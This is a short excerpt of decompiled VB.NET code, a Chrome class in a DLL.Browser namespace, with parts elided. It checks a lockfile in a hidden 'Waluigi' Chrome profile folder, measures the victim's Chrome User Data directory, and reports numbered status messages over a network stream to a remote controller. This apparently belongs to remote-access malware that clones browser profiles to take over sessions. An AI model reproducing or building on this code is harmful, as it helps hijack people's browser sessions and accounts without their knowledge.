...
Namespace DLL.Browser
	Public Class Chrome
		...
		Public Shared Sub StartChrome(ByVal duplicate As Boolean)
			Try
				If Conversions.ToBoolean(Outils.IsFileOpen(New FileInfo(Interaction.Environ("localappdata") & "\Google\Chrome\Waluigi\lockfile"))) Then
					Outils.SendInformation(Outils.nstream, "25|Chrome has already been opened!")
					Return
				End If
				If duplicate Then
					Outils.SendInformation(Outils.nstream, "22|" & Conversions.ToString(Math.Round(CDbl((New GetDirSize()).GetDirSizez(Interaction.Environ("localappdata") & "\Google\Chrome\User Data")) / 1024.0 / 1024.0)))
					...
					Outils.SendInformation(Outils.nstream, "200|" & Conversions.ToString(Math.Round(CDbl((New GetDirSize()).GetDirSizez(Interaction.Environ("localappdata") & "\Google\Chrome\User Data")) / 1024.0 / 1024.0)))
				Else
					Outils.SendInformation(Outils.nstream, "201|" & Conversions.ToString(Math.Round(CDbl((New GetDirSize()).GetDirSizez(Interaction.Environ("localappdata") & "\Google\Chrome\User Data")) / 1024.0 / 1024.0)))
				...
				stopwatch.[Stop]()
				Dim processesByName2 As Process() = Process.GetProcessesByName("chrome")
